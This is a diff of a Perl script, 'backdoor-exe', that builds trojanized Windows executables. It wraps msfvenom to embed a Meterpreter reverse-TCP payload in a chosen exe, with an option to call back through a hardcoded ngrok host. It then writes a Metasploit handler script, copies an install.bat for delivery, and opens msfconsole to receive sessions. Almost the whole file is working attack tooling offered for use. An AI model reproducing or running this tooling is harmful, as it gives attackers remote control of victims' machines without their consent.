@@ -1,14 +1,40 @@
 #!/usr/bin/perl
-#Coded By Zero#
-print("installing Dependencies...\n");
-system("apt install zipalign -y");
+#Coded By Zero
+if( $ARGV[0] eq '') {
+system("apt install zipalign -y >/dev/null");
 system("clear");
-print("Backdoor-EXE Loading...\n");
+print("\nBackdoor-exe installed use -h for help\n");
+exit; }
+
 if( $ARGV[0] eq '-h' || $ARGV[0] eq '--help') {
+print "Usage: backdoor-exe -t <ip/ddns> <port> <out>\n\n";
 print "Usage: backdoor-exe -i <exe> <ip/ddns> <port> <out>\n\n";
 print "Usage: backdoor-exe -n <exe> <ngrok_host> <ngrok_port> <fwdport> <out>\n\n";
 print "Ex: https://github.com/YSpoof/backdoor-exe\n";
 exit; }
+
+#TestMode
+if( $ARGV[0] eq '-t') {
+$host=$ARGV[1];
+$port=$ARGV[2];   
+$out=$ARGV[3]; 
+
+system("msfvenom -f exe -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $out");
+system("clear");
+system("echo Saved as: $out");
+system("echo use exploit/multi/handler > /tmp/x");
+system("echo set payload windows/meterpreter/reverse_tcp >> /tmp/x");
+system("echo set lhost $host >> /tmp/x");
+system("echo set lport $port >> /tmp/x");
+system("echo set ExitOnSession false >> /tmp/x");
+system("echo set EnableStageEncoding true >> /tmp/x");
+system("echo run -jz >> /tmp/x");
+system("echo clear >> /tmp/x");
+system("cp /tmp/x ./backdoor-exe.rc");
+print("Copying install file...\n");
+system("cp /opt/backdoor-exe/install.bat ./install.bat");
+print("Opening MSF..\n");
+system("msfconsole -qr /tmp/x"); }
 
 #NoNgrok
 if( $ARGV[0] eq '-i') {
@@ -24,19 +50,23 @@ system("echo use exploit/multi/handler > /tmp/x");
 system("echo set payload windows/meterpreter/reverse_tcp >> /tmp/x");
 system("echo set lhost $host >> /tmp/x");
 system("echo set lport $port >> /tmp/x");
-system("echo run -j -z >> /tmp/x");
+system("echo run -jz >> /tmp/x");
+system("echo set ExitOnSession false >> /tmp/x");
+system("echo set EnableStageEncoding true >> /tmp/x");
 system("echo clear >> /tmp/x");
 system("cp /tmp/x ./backdoor-exe.rc");
+print("Copying install file...\n");
+system("cp /opt/backdoor-exe/install.bat ./install.bat");
 print("Opening MSF..\n");
-system("msfconsole -q -r /tmp/x"); }
+system("msfconsole -qr /tmp/x"); }
  
 #Ngrok
 if( $ARGV[0] eq '-n' ) {
 $exe=$ARGV[1];
-$host=$ARGV[2];
-$port=$ARGV[3];
-$lport=$ARGV[4];    
-$out=$ARGV[5];
+$host="0.tcp.ngrok.io";
+$port=$ARGV[2];
+$lport=$ARGV[3];    
+$out=$ARGV[4];
 
 system("msfvenom -x $exe -f exe -k -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $out");
 system("clear");
@@ -45,8 +75,10 @@ system("echo use exploit/multi/handler > /tmp/x");
 system("echo set payload windows/meterpreter/reverse_tcp >> /tmp/x");
 system("echo set lhost 0.0.0.0 >> /tmp/x");
 system("echo set lport $lport >> /tmp/x");
-system("echo run -j -z >> /tmp/x");
+system("echo run -jz >> /tmp/x");
 system("echo clear >> /tmp/x");
 system("cp /tmp/x ./backdoor-exe-ngrok.rc");
+print("Copying install file...\n");
+system("cp /opt/backdoor-exe/install.bat ./install.bat");
 print("Opening MSF..\n");
-system("msfconsole -q -r /tmp/x"); }
+system("msfconsole -qr /tmp/x"); }
